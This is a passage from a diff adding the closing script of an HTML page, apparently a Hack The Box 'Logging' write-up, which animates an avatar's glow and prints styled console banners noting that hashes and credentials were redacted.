+                        '0 0 0 2px var(--bg-secondary), 0 0 0 4px var(--accent-cyan), 0 0 20px rgba(91,200,255,0.2)';
+                } else if (phase === 2) {
+                    avatar.style.boxShadow =
+                        '0 0 0 2px var(--bg-secondary), 0 0 0 4px var(--accent-purple), 0 0 28px rgba(139,92,246,0.25)';
+                }
+            }, 2200);
+        })();
+
+        console.log(
+            '%c🛡️ HTB Logging Write-up %cby Cosme Noide',
+            'background:#0b0e14;color:#5bc8ff;font-size:16px;font-weight:bold;padding:6px 12px;border-radius:4px 0 0 4px;',
+            'background:#0b0e14;color:#e8edf2;font-size:16px;padding:6px 12px;border-radius:0 4px 4px 0;'
+        );
+        console.log('%c🔐 Hashes y credenciales han sido redactados por políticas de seguridad.',
+            'color:#a0b3c9;font-style:italic;');
+    </script>
+
+</body>
+</html>
